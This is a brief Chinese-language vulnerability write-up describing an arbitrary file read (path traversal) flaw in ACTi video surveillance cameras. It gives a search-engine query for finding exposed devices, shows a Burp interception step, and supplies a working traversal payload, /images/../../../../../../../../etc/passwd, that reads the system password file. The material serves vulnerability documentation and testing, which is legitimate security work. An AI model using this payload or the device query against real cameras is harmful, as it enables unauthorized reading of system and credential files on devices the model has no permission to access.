# ACTI 视频监控 images 任意文件读取漏洞

## 漏洞描述

ACTI 视频监控 存在任意文件读取漏洞

## 漏洞影响

<a-checkbox checked>ACTI摄像头</a-checkbox></br>

## 网络测绘

<a-checkbox checked>app="ACTi-视频监控"</a-checkbox></br>

## 漏洞复现

登录页面如下



![img](../../../.vuepress/public/img/ac-1.png)



使用Burp抓包



```plain
/images/../../../../../../../../etc/passwd
```



![img](../../../.vuepress/public/img/ac-2.png)